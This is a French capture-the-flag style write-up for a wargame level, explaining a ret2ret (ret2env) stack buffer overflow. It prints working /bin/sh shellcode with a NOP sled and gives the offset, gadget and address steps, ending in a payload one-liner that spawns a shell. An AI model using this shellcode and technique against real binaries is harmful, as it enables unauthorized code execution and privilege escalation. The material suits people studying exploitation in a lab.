# Exploit ret2ret (ret2env) - Level2

## ✨ Objectif

Exploiter un binaire vulnérable via un débordement de tampon (“stack buffer overflow”) en utilisant une technique **ret2ret** combinée avec un **shellcode** placé dans l'environnement (ret2env).

---

## 🌐 Contexte

* Le binaire est protégé par une vérification :

  ```c
  if ((addr & 0xb0000000) == 0xb0000000) exit(1);
  ```

  Donc impossible de sauter directement vers la stack (`0xbffff...`), car bloqué.

* On contourne ce problème avec une astuce :

  * On saute à une **instruction `ret`** dans le binaire.
  * Cette instruction `ret` va ensuite sauter vers notre **shellcode** dans l'environnement.

---

## 🔢 Etapes de l’exploitation

### 1. Trouver l’offset pour atteindre EIP

```bash
python -c 'print("A"*80 + "BBBB")' > /tmp/payload
```

L’EIP est bien écrasé à 80 octets (0x42424242 = "BBBB").

---

### 2. Injecter le shellcode dans l’environnement

```bash
export SC=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

* Le `\x90` correspond à un NOP sled.
* Le reste est un shellcode pour lancer `/bin/sh`.

---

### 3. Trouver une adresse `ret` dans le programme

Dans GDB :

```bash
gdb ./level2
(gdb) disas main
```

Exemple :

```asm
0x0804854b <+12>:    ret
```

* Adresse à utiliser : `0x0804854b`
* Little endian : `\x4b\x85\x04\x08`

---

### 4. Trouver l'adresse du shellcode (dans l'env)

Dans GDB avec `SC` déjà exporté :

```bash
(gdb) x/200s *((char**)environ)
```

Exemple :

```
0xbfffff2a: "\x90\x90\x90...\x31\xc0\x50\x68..."
```

* Adresse shellcode = `0xbfffff2a`
* Little endian : `\x2a\xff\xff\xbf`

---

### 5. Construire le payload final

```bash
python -c 'print("A"*80 + "\x4b\x85\x04\x08" + "\x2a\xff\xff\xbf")' > /tmp/payload
```

---

### 6. Exécuter l’exploit

```bash
cat /tmp/payload - | ./level2
```

Tape ensuite :

```bash
whoami
```

Si tu vois :

```
level3
```

🎉 Exploit réussi !

---

## 🔎 A retenir

* Toujours **vérifier les protections** (NX, RELRO, etc)
* Si la stack est bloquée, essayer l'“environment”
* Une instruction `ret` dans le code peut servir de **trampoline**
* Toujours bien **convertir les adresses en little endian**

---

## 🎓 Liens utiles

* [Shellcode /bin/sh - shell-storm](http://shell-storm.org/shellcode/files/shellcode-219.html)
* [x86 Assembly Reference](http://ref.x86asm.net/coder.html)
* [NOP sleds - LiveOverflow](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=818s)

---

Félicitations pour avoir compris et reproduit une attaque `ret2ret` ! 🚀
